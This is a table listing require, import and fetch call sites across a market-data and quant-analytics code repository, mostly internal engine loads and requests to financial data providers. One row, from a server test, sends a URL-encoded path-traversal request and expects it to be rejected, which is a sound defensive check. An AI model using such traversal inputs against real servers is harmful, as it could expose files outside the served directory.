-| scripts/discover/watchlist-coupling-qa.mjs | fetch('/quant/data/universe/instruments/' + globalThis.VUCore.Identity.shardKey('MSFT') + '.json')).json()).instruments.find(i => i.symbol === 'MSFT' && i.active).ins |
-| scripts/market/apply-exchange-directory.mjs | require(join(root, "quant", "engines", "us-security-master.js")) |
-| scripts/market/apply-exchange-directory.mjs | require(join(root, "quant", "engines", "company-master.js")) |
-| scripts/market/apply-exchange-directory.mjs | require(join(root, "core", "identity.js")) |
-| scripts/market/apply-exchange-directory.mjs | fetch("https://www.nasdaqtrader.com/dynamic/SymDir/" + name + ".txt", { signal: AbortSignal.timeout(45000) }) |
-| scripts/market/apply-name-layer-class.mjs | require(join(root, "quant", "engines", "us-security-master.js")) |
-| scripts/market/apply-name-layer-class.mjs | require(join(root, "quant", "engines", "company-master.js")) |
-| scripts/market/assert-daily-lifecycle-health.mjs | require(join(root, "quant", "engines", "realtime", "trading-session.js")) |
-| scripts/market/assert-daily-lifecycle-health.mjs | require(join(root, "quant", "engines", "daily-lifecycle-health.js")) |
-| scripts/market/assert-intraday-delivery.mjs | require(join(engines, "realtime", "delivery-watchdog.js")) |
-| scripts/market/assert-intraday-delivery.mjs | require(join(engines, "realtime", "trading-session.js")) |
-| scripts/market/assert-intraday-delivery.mjs | require(join(root, "quant", "config", "market-calendar.json")) |
-| scripts/market/assert-intraday-delivery.mjs | fetch(url, { headers: { "cache-control": "no-cache" } }) |
-| scripts/market/attach-live-domain.mjs | fetch(API + pfad, Object.assign({ |
-| scripts/market/build-company-names.mjs | require(join(ROOT, "core", "identity.js")) |
-| scripts/market/build-company-names.mjs | import(join(ROOT, "scripts", "market", "lib", "security-master-duplicate-resolution.mjs")) |
-| scripts/market/build-company-names.mjs | import(join(root, "scripts", "market", "universe-source.mjs")) |
-| scripts/market/build-company-names.mjs | fetch(SEC_URL, { headers: { "User-Agent": ua, "Accept": "application/json" } }) |
-| scripts/market/build-company-names.mjs | require(join(ROOT, "providers", "tiingo", "adapter.js")) |
-| scripts/market/build-company-names.mjs | require(join(ROOT, "quant", "engines", "symbol-mapping.js")) |
-| scripts/market/build-company-names.mjs | fetch(url, init) |
-| scripts/market/build-coverage-metrics.mjs | require(join(root, "quant", "engines", "coverage-metrics.js")) |
-| scripts/market/build-coverage-metrics.mjs | require(join(root, "quant", "engines", "zero-cost-guard.js")) |
-| scripts/market/build-coverage-metrics.mjs | require(join(root, "quant", "engines", "history-store.js")) |
-| scripts/market/build-coverage-metrics.mjs | import(join(root, "scripts", "market", "storage", "fs-driver.mjs")) |
-| scripts/market/build-coverage-metrics.mjs | import(join(root, "scripts", "market", "storage", "s3-driver.mjs")) |
-| scripts/market/build-currency-coverage.mjs | require(join(ROOT, "quant", "engines", "fx", "currency-registry.js")) |
-| scripts/market/build-fx-history-ecb.mjs | require(join(ROOT, "providers", "ecb", "adapter.js")) |
-| scripts/market/build-fx-history-ecb.mjs | require(join(ROOT, "quant", "engines", "fx", "fx-rates.js")) |
-| scripts/market/build-fx-history-ecb.mjs | require(join(ROOT, "quant", "engines", "fx", "currency-registry.js")) |
-| scripts/market/build-fx-history-ecb.mjs | require(join(ROOT, "quant", "engines", "fx", "fx-provider-registry.js")) |
-| scripts/market/build-fx-history-ecb.mjs | fetch(FEED.url, { headers: { Accept: "application/xml" } }) |
-| scripts/market/build-fx-history.mjs | require(join(ROOT, "quant", "engines", "fx", "fx-rates.js")) |
-| scripts/market/build-fx-history.mjs | require(join(ROOT, "quant", "engines", "fx", "fx-provider-registry.js")) |
-| scripts/market/build-fx-history.mjs | require(join(ROOT, "quant", "engines", "capabilities.js")) |
-| scripts/market/build-fx-history.mjs | fetch(`${BASE}/tiingo/fx/${ticker}/prices?resampleFreq=1day&startDate=${startDate}`, |
-| scripts/market/build-fx-pair-requirements.mjs | require(join(ROOT, "quant", "engines", "fx", "currency-registry.js")) |
-| scripts/market/build-index-membership.mjs | require(join(root, "quant", "engines", "index-membership.js")) |
-| scripts/market/build-index-membership.mjs | fetch(url, { headers, redirect: "follow" }) |
-| scripts/market/build-market-factors.mjs | require(join(root, "core", "identity.js")) |
-| scripts/market/build-market-factors.mjs | require(join(engines, "market-factors.js")) |
-| scripts/market/build-market-factors.mjs | require(join(engines, "return-semantics.js")) |
-| scripts/market/build-market-factors.mjs | require(join(engines, "market-quality.js")) |
-| scripts/market/build-market-factors.mjs | require(join(engines, "market-store.js")) |
-| scripts/market/build-market-factors.mjs | require(join(engines, "ranking-hygiene.js")) |
-| scripts/market/build-market-pulse.mjs | require(join(root, "quant/engines/multi-asset/market-pulse.js")) |
-| scripts/market/build-market-pulse.mjs | require(join(root, "core/identity.js")) |
-| scripts/market/build-market-universe.mjs | require(join(root, "quant", "engines", "instrument-classification.js")) |
-| scripts/market/build-market-universe.mjs | fetch(TICKERS_URL, { headers }) |
-| scripts/market/build-ownership-signals.mjs | require(join(ROOT, "quant", "engines", "ownership-signals.js")) |
-| scripts/market/build-ownership-signals.mjs | require(join(ROOT, "core", "identity.js")) |
-| scripts/market/build-ownership-signals.mjs | import(join(root, "scripts/market/universe-source.mjs")).then(({ resolveProductUniverse }) => |
-| scripts/market/build-us-eligibility.mjs | require(join(root, "quant", "engines", "us-security-master.js")) |
-| scripts/market/build-us-eligibility.mjs | require(join(root, "quant", "engines", "company-master.js")) |
-| scripts/market/build-us-eligibility.mjs | require(join(root, "quant", "engines", "coverage-metrics.js")).VERSION, |
-| scripts/market/build-us-security-master.mjs | require(join(root, "quant", "engines", "us-security-master.js")) |
-| scripts/market/build-us-security-master.mjs | import(join(root, "scripts", "market", "build-market-universe.mjs")) |
-| scripts/market/build-us-security-master.mjs | import(join(root, "scripts", "market", "lib", "security-master-duplicate-resolution.mjs")) |
-| scripts/market/build-us-security-master.mjs | fetch(TICKERS_URL, { headers }) |
-| scripts/market/build-us-security-master.mjs | require(       join(root, "quant", "engines", "instrument-classification.js")).VERSION, |
-| scripts/market/check-freshness.mjs | require(join(root, "quant", "engines", "realtime", "trading-session.js")) |
-| scripts/market/check-freshness.mjs | require(join(root, "quant", "engines", "realtime", "freshness.js")) |
-| scripts/market/check-freshness.mjs | require(join(DEFAULT_ROOT, "core", "identity.js")) |
-| scripts/market/check-freshness.mjs | fetch(url, { headers: { "cache-control": "no-cache" } }) |
-| scripts/market/classify-rejections.mjs | require(join(root, "quant", "engines", "rejection-lifecycle.js")) |
-| scripts/market/evaluate-provider.mjs | require(join(root, "quant", "engines", "symbol-mapping.js")) |
-| scripts/market/evaluate-provider.mjs | require(join(root, "quant", "engines", "market-quality.js")) |
-| scripts/market/evaluate-provider.mjs | require(spec.module) |
-| scripts/market/evaluate-provider.mjs | fetch(url, init) |
-| scripts/market/expand-us-universe.mjs | require(join(root, "quant", "engines", "us-security-master.js")) |
-| scripts/market/fetch-market-data.mjs | require(join(engines, "symbol-mapping.js")) |
-| scripts/market/fetch-market-data.mjs | require(join(engines, "market-quality.js")) |
-| scripts/market/fetch-market-data.mjs | require(join(engines, "data-mode.js")) |
-| scripts/market/fetch-market-data.mjs | require(join(root, "providers", "twelve-data", "adapter.js")) |
-| scripts/market/fetch-market-data.mjs | fetch(url, init) |
-| scripts/market/guard-listing-continuity.mjs | require(join(root, "quant", "engines", "survivorship-control.js")) |
-| scripts/market/ingest-fx-intraday.mjs | require(join(ROOT, "quant", "engines", "fx", "fx-rates.js")) |
-| scripts/market/ingest-fx-intraday.mjs | require(join(ROOT, "quant", "engines", "fx", "fx-provider-registry.js")) |
-| scripts/market/ingest-fx-intraday.mjs | require(join(ROOT, "quant", "engines", "capabilities.js")) |
-| scripts/market/ingest-fx-intraday.mjs | fetch(`${BASE}/tiingo/fx/top?tickers=${ticker}`, |
-| scripts/market/ingest-intraday.mjs | require(join(engines, "symbol-mapping.js")) |
-| scripts/market/ingest-intraday.mjs | require(join(engines, "market-store.js")) |
-| scripts/market/ingest-intraday.mjs | require(join(engines, "display-policy.js")) |
-| scripts/market/ingest-intraday.mjs | require(join(engines, "realtime", "trading-session.js")) |
-| scripts/market/ingest-intraday.mjs | require(join(engines, "realtime", "intraday-snapshot.js")) |
-| scripts/market/ingest-intraday.mjs | require(join(engines, "realtime", "freshness.js")) |
-| scripts/market/ingest-intraday.mjs | require(join(engines, "realtime", "intraday-scope.js")) |
-| scripts/market/ingest-intraday.mjs | require(join(DEFAULT_ROOT, "core", "identity.js")) |
-| scripts/market/ingest-intraday.mjs | require(join(root, "providers", "tiingo", "adapter.js")) |
-| scripts/market/ingest-intraday.mjs | fetch(url, init) |
-| scripts/market/ingest-multi-asset.mjs | require(join(root, "quant/engines/multi-asset/instrument-catalog.js")) |
-| scripts/market/ingest-multi-asset.mjs | require(join(root, "quant/api/multi-asset-contract.js")) |
-| scripts/market/ingest-multi-asset.mjs | require(join(root, "providers/tiingo/adapter.js")) |
-| scripts/market/ingest-multi-asset.mjs | require(join(root, "providers/ecb/adapter.js")) |
-| scripts/market/ingest-multi-asset.mjs | require(join(root, "providers/us-treasury/adapter.js")) |
-| scripts/market/ingest-multi-asset.mjs | require(join(root, "providers/nyfed/adapter.js")) |
-| scripts/market/ingest-multi-asset.mjs | require(join(root, "providers/bundesbank/adapter.js")) |
-| scripts/market/ingest-multi-asset.mjs | require(join(root, "providers/eia/adapter.js")) |
-| scripts/market/ingest-multi-asset.mjs | require(join(root, "providers/fred/adapter.js")) |
-| scripts/market/ingest-multi-asset.mjs | require(join(root, "providers/nikkei/adapter.js")) |
-| scripts/market/ingest-multi-asset.mjs | require(join(root, "providers/fmp/adapter.js")) |
-| scripts/market/ingest-multi-asset.mjs | require(join(root, "quant/config/multi-asset.json")) |
-| scripts/market/ingest-multi-asset.mjs | require(join(root, "quant/config/market-calendar.json")) |
-| scripts/market/ingest-multi-asset.mjs | require(join(root, "quant/config/multi-asset-instruments.json")) |
-| scripts/market/ingest-multi-asset.mjs | fetch(url, { headers: { "User-Agent": UA }, signal: ctrl.signal }) |
-| scripts/market/ingest-multi-asset.mjs | fetch(u, i) |
-| scripts/market/ingest-multi-asset.mjs | fetch(url, { headers: { "User-Agent": UA } }) |
-| scripts/market/ingest-tiingo.mjs | require(join(engines, "symbol-mapping.js")) |
-| scripts/market/ingest-tiingo.mjs | require(join(engines, "market-quality.js")) |
-| scripts/market/ingest-tiingo.mjs | require(join(engines, "return-series.js")) |
-| scripts/market/ingest-tiingo.mjs | require(join(engines, "price-semantics.js")) |
-| scripts/market/ingest-tiingo.mjs | require(join(engines, "market-eod-gate.js")) |
-| scripts/market/ingest-tiingo.mjs | require(join(engines, "rejection-lifecycle.js")) |
-| scripts/market/ingest-tiingo.mjs | require(join(engines, "market-store.js")) |
-| scripts/market/ingest-tiingo.mjs | require(join(engines, "display-policy.js")) |
-| scripts/market/ingest-tiingo.mjs | require(join(root, "providers", "tiingo", "adapter.js")) |
-| scripts/market/ingest-tiingo.mjs | fetch(url, init) |
-| scripts/market/lib/corporate-action-confirmations.mjs | require(join(ROOT, "core", "identity.js")) |
-| scripts/market/lib/security-master-duplicate-resolution.mjs | require(join(root, "quant", "engines", "us-security-master.js")) |
-| scripts/market/lib/security-master-duplicate-resolution.mjs | require(join(root, "core", "identity.js")) |
-| scripts/market/lib/split-evidence-supplements.mjs | require(join(ROOT, "core", "identity.js")) |
-| scripts/market/long-series-repair-plan.mjs | require(join(REPO_ROOT, "core", "data-quality.js")) |
-| scripts/market/preflight-zero-cost.mjs | require(join(root, "quant", "engines", "zero-cost-guard.js")) |
-| scripts/market/preflight-zero-cost.mjs | require(join(root, "quant", "engines", "history-store.js")) |
-| scripts/market/preflight-zero-cost.mjs | import(join(root, "scripts", "market", "storage", "fs-driver.mjs")) |
-| scripts/market/preflight-zero-cost.mjs | import(join(root, "scripts", "market", "storage", "s3-driver.mjs")) |
-| scripts/market/probe-cloudflare-scope.mjs | fetch(API + p.pfad, { |
-| scripts/market/probe-free-sources.mjs | fetch(url, { method: post ? "POST" : method, headers: h, signal: ctrl.signal, redirect: "follow", |
-| scripts/market/probe-index-sources.mjs | fetch(url, { headers, signal: ctrl.signal, redirect: "follow" }) |
-| scripts/market/probe-multi-asset.mjs | require(join(root, "quant", "engines", "multi-asset", "instrument-catalog.js")) |
-| scripts/market/probe-multi-asset.mjs | fetch(url, { headers, signal: ctrl.signal }) |
-| scripts/market/probe-provider-split.mjs | fetch(url, { headers: { Authorization: "Token " + key, "Content-Type": "application/json" } }) |
-| scripts/market/probe-tiingo-fx.mjs | require(join(root, "quant", "engines", "fx", "fx-capability.js")) |
-| scripts/market/probe-tiingo-fx.mjs | require(join(root, "quant", "engines", "capabilities.js")) |
-| scripts/market/probe-tiingo-fx.mjs | fetch(url, { |
-| scripts/market/publish-discover-series.mjs | require(join(HERE, "..", "..", "quant", "engines", "survivorship-control.js")) |
-| scripts/market/publish-discover-series.mjs | require(join(HERE, "..", "..", "quant", "engines", "published-close.js")) |
-| scripts/market/publish-discover-series.mjs | require(join(HERE, "..", "..", "quant", "engines", "return-series.js")) |
-| scripts/market/publish-discover-series.mjs | require(join(engines, "display-policy.js")) |
-| scripts/market/publish-discover-series.mjs | require(join(engines, "market-store.js")) |
-| scripts/market/publish-long-series.mjs | require(join(root, "quant", "engines", "series-sampling.js")) |
-| scripts/market/publish-long-series.mjs | require(join(root, "quant", "engines", "published-close.js")) |
-| scripts/market/publish-long-series.mjs | require(join(root, "quant", "engines", "history-store.js")) |
-| scripts/market/publish-long-series.mjs | require(join(root, "quant", "engines", "zero-cost-guard.js")) |
-| scripts/market/publish-long-series.mjs | require(join(root, "quant", "engines", "display-policy.js")) |
-| scripts/market/publish-long-series.mjs | require(join(root, "quant", "engines", "survivorship-control.js")) |
-| scripts/market/publish-long-series.mjs | require(join(root, "quant", "engines", "corporate-action-evidence.js")) |
-| scripts/market/publish-long-series.mjs | import(join(root, "scripts", "market", "storage", "fs-driver.mjs")) |
-| scripts/market/publish-long-series.mjs | import(join(root, "scripts", "market", "storage", "s3-driver.mjs")) |
-| scripts/market/qualify-providers.mjs | require(join(root, "quant", "engines", "provider-qualification.js")) |
-| scripts/market/refresh-benchmark-history.mjs | require(join(engines, "symbol-mapping.js")) |
-| scripts/market/refresh-benchmark-history.mjs | require(join(engines, "market-quality.js")) |
-| scripts/market/refresh-benchmark-history.mjs | require(join(engines, "canonical-total-return.js")) |
-| scripts/market/refresh-benchmark-history.mjs | require(join(engines, "market-store.js")) |
-| scripts/market/refresh-benchmark-history.mjs | require(join(engines, "display-policy.js")) |
-| scripts/market/refresh-benchmark-history.mjs | require(join(root, "providers", "tiingo", "adapter.js")) |
-| scripts/market/refresh-benchmark-history.mjs | fetch(url, init) }) |
-| scripts/market/repair-total-return-history.mjs | require(join(engines, "symbol-mapping.js")) |
-| scripts/market/repair-total-return-history.mjs | require(join(engines, "market-quality.js")) |
-| scripts/market/repair-total-return-history.mjs | require(join(engines, "market-store.js")) |
-| scripts/market/repair-total-return-history.mjs | require(join(engines, "display-policy.js")) |
-| scripts/market/repair-total-return-history.mjs | require(join(root, "providers", "tiingo", "adapter.js")) |
-| scripts/market/repair-total-return-history.mjs | require(join(engines, "history-store.js")) |
-| scripts/market/repair-total-return-history.mjs | require(join(engines, "zero-cost-guard.js")) |
-| scripts/market/repair-total-return-history.mjs | import(join(root, "scripts", "market", "storage", "s3-driver.mjs")) |
-| scripts/market/repair-total-return-history.mjs | fetch(url, init) }) |
-| scripts/market/run-pacemaker.mjs | require(join(engines, "realtime", "pacemaker.js")) |
-| scripts/market/run-pacemaker.mjs | require(join(engines, "realtime", "trading-session.js")) |
-| scripts/market/run-pacemaker.mjs | require(join(root, "quant", "config", "market-calendar.json")) |
-| scripts/market/run-scale-gate.mjs | require(join(root, "core", "identity.js")) |
-| scripts/market/run-scale-gate.mjs | require(join(engines, "symbol-mapping.js")) |
-| scripts/market/run-scale-gate.mjs | require(join(engines, "market-quality.js")) |
-| scripts/market/run-scale-gate.mjs | require(join(engines, "market-store.js")) |
-| scripts/market/run-scale-gate.mjs | require(join(engines, "display-policy.js")) |
-| scripts/market/run-scale-gate.mjs | require(join(root, "providers", "tiingo", "adapter.js")) |
-| scripts/market/run-scale-gate.mjs | fetch(url, init) |
-| scripts/market/security-master-v130-evidence.mjs | require(join(ROOT, "quant/engines/us-security-master.js")) |
-| scripts/market/security-master-v130-evidence.mjs | require(join(ROOT, "core/identity.js")) |
-| scripts/market/smoke-vu-live.mjs | require(join(root, "quant", "engines", "realtime", "market-hours.js")) |
-| scripts/market/smoke-vu-live.mjs | fetch(httpUrl("/version"), { headers: { Origin: ERLAUBTER_URSPRUNG } }) |
-| scripts/market/smoke-vu-live.mjs | fetch(httpUrl("/health"), { headers: { Origin: ERLAUBTER_URSPRUNG } }) |
-| scripts/market/smoke-vu-live.mjs | fetch() setzt ihn nicht, es |
-| scripts/market/smoke-vu-live.mjs | fetch(httpUrl("/version"), { |
-| scripts/market/smoke-vu-live.mjs | fetch(httpUrl("/version"), { headers: { Origin: FREMDER_URSPRUNG } }) |
-| scripts/market/smoke-vu-live.mjs | fetch(httpUrl("/version"), { |
-| scripts/market/smoke-vu-live.mjs | fetch(httpUrl("/health"), { headers: { Origin: ERLAUBTER_URSPRUNG } }) |
-| scripts/market/split-supplement-effect.mjs | require(join(ROOT, "quant", "engines", "published-close.js")) |
-| scripts/market/split-supplement-effect.mjs | require(join(ROOT, "quant", "engines", "corporate-action-evidence.js")) |
-| scripts/market/split-supplement-effect.mjs | require(join(ROOT, "quant", "engines", "weekly-real-adapter.cjs")) |
-| scripts/market/split-supplement-effect.mjs | require(join(ROOT, "fundamental", "engine", "catalog.js")) |
-| scripts/market/split-supplement-effect.mjs | import(join(ROOT, "scripts", "fundamental", "build-history.mjs")) |
-| scripts/market/study-return-basis-universe.mjs | require(join(ROOT, "core", "identity.js")) |
-| scripts/market/study-return-basis-universe.mjs | require(join(ROOT, "quant/engines/return-series.js")) |
-| scripts/market/study-return-basis-universe.mjs | require(join(ROOT, "quant/engines/return-basis-comparison.js")) |
-| scripts/market/study-return-basis-universe.mjs | require(join(ROOT, "quant/engines/sic-peer-taxonomy.js")) |
-| scripts/market/sync-history-store.mjs | require(join(root, "quant", "engines", "history-store.js")) |
-| scripts/market/sync-history-store.mjs | require(join(root, "quant", "engines", "zero-cost-guard.js")) |
-| scripts/market/sync-history-store.mjs | require(join(root, "quant", "engines", "bar-codec.js")) |
-| scripts/market/sync-history-store.mjs | require(join(root, "quant", "engines", "survivorship-control.js")) |
-| scripts/market/sync-history-store.mjs | import(join(root, "scripts", "market", "storage", "fs-driver.mjs")) |
-| scripts/market/sync-history-store.mjs | import(join(root, "scripts", "market", "storage", "s3-driver.mjs")) |
-| scripts/market/verify-dynamic-subscribe.mjs | require(join(root, "providers", "tiingo", "realtime.js")) |
-| scripts/market/verify-dynamic-subscribe.mjs | require(join(root, "quant", "engines", "realtime", "market-hours.js")) |
-| scripts/market/verify-live-candle.mjs | require(join(engines, "realtime", "transport.js")) |
-| scripts/market/verify-live-candle.mjs | require(join(engines, "realtime", "bar-merge.js")) |
-| scripts/market/verify-live-candle.mjs | require(join(engines, "realtime", "market-hours.js")) |
-| scripts/market/verify-live-candle.mjs | require(join(root, "providers", "tiingo", "realtime.js")) |
-| scripts/market/verify-live-candle.mjs | fetch(`${REST_BASE}/iex/${encodeURIComponent(sym.toLowerCase())}`, |
-| scripts/market/verify-request-limits.mjs | require(join(root, "providers", "tiingo", "adapter.js")) |
-| scripts/market/verify-request-limits.mjs | fetch(url, opts &#124;&#124; {}) |
-| scripts/market/verify-runtime-load.mjs | require(join(engines, "realtime", "bar-merge.js")) |
-| scripts/market/verify-runtime-load.mjs | require(join(root, "providers", "tiingo", "realtime.js")) |
-| scripts/market/verify-semantics-parity.mjs | require(join(root, "quant", "engines", "price-semantics.js")) |
-| scripts/market/verify-tiingo-commercial.mjs | require(join(root, "providers", "tiingo", "adapter.js")) |
-| scripts/market/verify-tiingo-commercial.mjs | require(join(engines, "realtime", "market-hours.js")) |
-| scripts/market/verify-tiingo-commercial.mjs | require(join(engines, "market-quality.js")) |
-| scripts/market/verify-tiingo-commercial.mjs | fetch(url, init) |
-| scripts/market/verify-tiingo-realtime.mjs | require(join(root, "providers", "tiingo", "adapter.js")) |
-| scripts/market/verify-tiingo-realtime.mjs | require(join(root, "providers", "tiingo", "realtime.js")) |
-| scripts/market/verify-tiingo-realtime.mjs | require(join(engines, "realtime", "market-hours.js")) |
-| scripts/market/verify-tiingo-realtime.mjs | require(join(engines, "realtime", "session-policy.js")) |
-| scripts/market/verify-tiingo-realtime.mjs | fetch(url, init), |
-| scripts/market/verify-tiingo-runtime.mjs | require(join(engines, "symbol-mapping.js")) |
-| scripts/market/verify-tiingo-runtime.mjs | require(join(root, "providers", "tiingo", "adapter.js")) |
-| scripts/market/verify-tiingo-runtime.mjs | fetch(url, init) |
-| scripts/market/verify-vu-live-e2e.mjs | import(join(root, "worker", "tests", "harness.mjs")) |
-| scripts/market/verify-vu-live-e2e.mjs | import(join(root, "worker", "src", "vu-live.mjs")) |
-| scripts/market/verify-vu-live-e2e.mjs | fetch(anfrage("https://vu-live/live", { Upgrade: "websocket" })) |
-| scripts/marketstack/europe-marketstack-diagnostics-once.mjs | fetch (sharedBudget.reserve). |
-| scripts/mobile/tests/server.test.mjs | fetch(base+'/') |
-| scripts/mobile/tests/server.test.mjs | fetch(base+'/NV.json.gz') |
-| scripts/mobile/tests/server.test.mjs | fetch(base+'/absent.json')).status,404) |
-| scripts/mobile/tests/server.test.mjs | fetch(base+'/%2e%2e%2foutside')).status,404) |
-| scripts/quality/audit-fx-provider-seam.mjs | require(join(FXDIR, "fx-rates.js")) |
-| scripts/quality/audit-fx-provider-seam.mjs | require(join(FXDIR, "fx-provider-registry.js")) |
-| scripts/quality/chart-parity.mjs | require(join(REPO_ROOT, "core", "identity.js")) |
-| scripts/quality/chart-parity.mjs | require(join(REPO_ROOT, "core", "data-quality.js")) |
-| scripts/quality/chart-parity.mjs | require(join(REPO_ROOT, "core", "chart-history.js")) |
-| scripts/quality/chart-parity.mjs | require(join(REPO_ROOT, "quant", "engines", "return-series.js")) |
-| scripts/quality/chart-parity.mjs | require(join(REPO_ROOT, "quant", "engines", "realtime", "trading-session.js")) |
-| scripts/quality/chart-parity.mjs | require(join(REPO_ROOT, "core", "chart-standard.js")) |
-| scripts/quality/chart-parity.mjs | require(join(REPO_ROOT, "quant", "engines", "fx", "fx-rates.js")) |
-| scripts/quality/chart-parity.mjs | require(join(REPO_ROOT, "quant", "engines", "fx", "currency-contract.js")) |
-| scripts/quality/find-unused.mjs | require(), fetch(), HTML src/href, CSS url(), |
-| scripts/quality/fundamental-compare-qa.mjs | require(arg('playwright', process.env.PLAYWRIGHT_PATH &#124;&#124; 'playwright')) |
-| scripts/quality/shell-browser-qa.mjs | require(arg('playwright', process.env.PLAYWRIGHT_PATH &#124;&#124; 'playwright')) |
-| scripts/quality/tests/find-unused.test.mjs | fetch(base + name) |
-| scripts/quality/tests/find-unused.test.mjs | import(`./${name}.mjs`) |
-| scripts/quality/verify-currency-layer.mjs | require(join(ROOT, "core", "identity.js")) |
-| scripts/quality/verify-currency-layer.mjs | require(join(FXDIR, "fx-rates.js")) |
-| scripts/quality/verify-currency-layer.mjs | require(join(FXDIR, "fx-provider-registry.js")) |
-| scripts/quality/verify-currency-layer.mjs | require(join(FXDIR, "currency-engine.js")) |
-| scripts/quality/verify-currency-layer.mjs | require(join(FXDIR, "currency-registry.js")) |
-| scripts/quality/verify-currency-layer.mjs | require(join(FXDIR, "money-format.js")) |
-| scripts/quality/verify-currency-layer.mjs | require(join(FXDIR, "currency-contract.js")) |
-| scripts/quality/verify-currency-layer.mjs | require(join(FXDIR, "fx-realtime-state.js")) |
-| scripts/quality/verify-currency-layer.mjs | require(join(FXDIR, "fx-freshness.js")) |
-| scripts/quality/verify-currency-layer.mjs | require(join(FXDIR, "fx-freshness.js")) |
-| scripts/quality/verify-historical-fx-coverage.mjs | require(join(FXDIR, "fx-rates.js")) |
-| scripts/quality/verify-historical-fx-coverage.mjs | require(join(FXDIR, "fx-provider-registry.js")) |
-| scripts/quality/verify-multi-asset.mjs | require(join(root, "quant/engines/multi-asset/asset-taxonomy.js")) |
-| scripts/quality/verify-multi-asset.mjs | require(join(root, "quant/engines/multi-asset/instrument-catalog.js")) |
-| scripts/quality/verify-multi-asset.mjs | require(join(root, "quant/api/multi-asset-contract.js")) |
-| scripts/quality/verify-multi-asset.mjs | require(join(root, "quant/config/multi-asset.json")) |
-| scripts/quality/verify-multi-asset.mjs | require(join(root, "quant/config/market-calendar.json")) |
-| scripts/quality/verify-multi-asset.mjs | require(join(root, "providers/fred/adapter.js")) |
-| scripts/quality/verify-multi-asset.mjs | fetch(SITE + path + (path.includes("?") ? "&" : "?") + "v=" + Date.now(), { headers: { "Cache-Control": "no-cache" } }) |
-| scripts/quality/verify-realtime-eur.mjs | require(join(FXDIR, "fx-rates.js")) |
-| scripts/quality/verify-realtime-eur.mjs | require(join(FXDIR, "fx-provider-registry.js")) |
-| scripts/quality/verify-realtime-eur.mjs | require(join(FXDIR, "fx-freshness.js")) |
-| scripts/quality/verify-realtime-eur.mjs | require(join(FXDIR, "fx-realtime-state.js")) |
-| scripts/quality/verify-realtime-eur.mjs | require(join(FXDIR, "currency-contract.js")) |
-| scripts/quality/verify-realtime-eur.mjs | require(join(FXDIR, "money-format.js")) |
-| scripts/quality/verify-realtime-eur.mjs | fetch(`${BASE}/iex/?tickers=${tickers.join(",")}`, |
-| scripts/quality/vu3-regression-qa.mjs | require(arg('playwright', process.env.PLAYWRIGHT_PATH &#124;&#124; 'playwright')) |
-| scripts/quality/vu3-regression-qa.mjs | fetch(base + '/supertrader/data/build.json').then((r) => r.json()).then((j) => (j.slices && j.slices.stock) &#124;&#124; []).catch(() => []) |
-| scripts/quant/assert-product-completeness.mjs | require(join(ROOT, "quant/engines/product-language.js")) |
-| scripts/quant/assert-product-completeness.mjs | require(join(ROOT, enginePath)) |
-| scripts/quant/backtest-generation-freeze.cjs | import(path.join(ROOT,'scripts/market/build-security-master-identity-blocklist.mjs')) |
-| scripts/quant/build-backtest-certification.mjs | require(P("quant/engines/backtest-certification.js")) |
-| scripts/quant/build-backtest-certification.mjs | require(P("quant/engines/profile-backtest.js")) |
-| scripts/quant/build-backtest-certification.mjs | require(P("quant/engines/signal-backtest.js")) |
-| scripts/quant/build-backtest-certification.mjs | require(P("quant/engines/backtest-artifact-consistency.js")) |
-| scripts/quant/build-backtest-certification.mjs | require(P("quant/engines/setup-oos.cjs")) |
-| scripts/quant/build-backtest-certification.mjs | require(P("quant/engines/survivorship-control.js")) |
-| scripts/quant/build-backtest-readiness.mjs | require(join(ROOT, "quant/engines/backtest-artifact-consistency.js")) |
-| scripts/quant/build-emerging-leaders-study.mjs | require(join(ROOT, "quant/engines/emerging-leaders.js")) |
-| scripts/quant/build-emerging-leaders-study.mjs | require(join(ROOT, "quant/engines/survivorship-control.js")) |
-| scripts/quant/build-emerging-leaders-study.mjs | require(join(ROOT, "quant/engines/history-store.js")) |
-| scripts/quant/build-emerging-leaders-study.mjs | require(join(ROOT, "quant/engines/zero-cost-guard.js")) |
-| scripts/quant/build-emerging-leaders-study.mjs | import(join(ROOT, "scripts/market/storage/s3-driver.mjs")) |
-| scripts/quant/build-evidence-status.mjs | require(P("quant/engines/historical-cases.js")) |
-| scripts/quant/build-factor-evidence.mjs | require(join(ROOT, "quant/engines/factor-evidence.js")) |
-| scripts/quant/build-factor-evidence.mjs | require(join(ROOT, "quant/engines/change-engine.js")) |
-| scripts/quant/build-factor-evidence.mjs | require(join(ROOT, "quant/engines/fundamental-inputs.js")) |
-| scripts/quant/build-factor-evidence.mjs | require(join(ROOT, "quant/engines/published-close.js")) |
-| scripts/quant/build-factor-evidence.mjs | require(join(ROOT, "quant/engines/catalog.js")) |
-| scripts/quant/build-factor-evidence.mjs | require(join(ROOT, "quant/engines/quant-radar.js")) |
-| scripts/quant/build-factor-evidence.mjs | require(join(ROOT, "quant/engines/us-security-master.js")) |
-| scripts/quant/build-factor-evidence.mjs | require(join(ROOT, "quant/engines/survivorship-control.js")) |
-| scripts/quant/build-factor-evidence.mjs | require(join(ROOT, "quant/engines/market-cap.js")) |
-| scripts/quant/build-golden-five-pit-coverage.mjs | require(join(root, "providers", "sec", "adapter.js")) |
-| scripts/quant/build-market-regime.mjs | require(join(ROOT, "quant/engines/market-regime.js")) |
-| scripts/quant/build-methodology-index.mjs | require(join(ROOT, "quant/engines/product-language.js")) |
-| scripts/quant/build-pattern-match.mjs | require(join(ROOT, "quant/engines/pattern-research.js")) |
-| scripts/quant/build-pattern-match.mjs | require(join(ROOT, "quant/engines/pit-fundamental-history.js")) |
-| scripts/quant/build-pattern-research-fundamentals.mjs | require(join(ROOT, "quant/engines/pattern-research.js")) |
-| scripts/quant/build-pattern-research-fundamentals.mjs | require(join(ROOT, "quant/engines/pit-fundamental-history.js")) |
-| scripts/quant/build-pattern-research.mjs | require(join(ROOT, "quant/engines/pattern-research.js")) |
-| scripts/quant/build-product-language-doc.mjs | require(join(ROOT, "quant/engines/product-language.js")) |
-| scripts/quant/build-quant-radar.mjs | require(join(ROOT, "quant/engines/quant-radar.js")) |
-| scripts/quant/build-quant-radar.mjs | require(join(ROOT, "quant/engines/setup-engine.js")) |
-| scripts/quant/build-quant-radar.mjs | require(join(ROOT, "quant/engines/historical-cases.js")) |
-| scripts/quant/build-quant-radar.mjs | require(join(ROOT, "quant/engines/us-security-master.js")) |
-| scripts/quant/build-quant-radar.mjs | require(join(ROOT, "quant/engines/survivorship-control.js")) |
-| scripts/quant/build-quant-radar.mjs | require(join(ROOT, "quant/engines/factor-evidence.js")) |
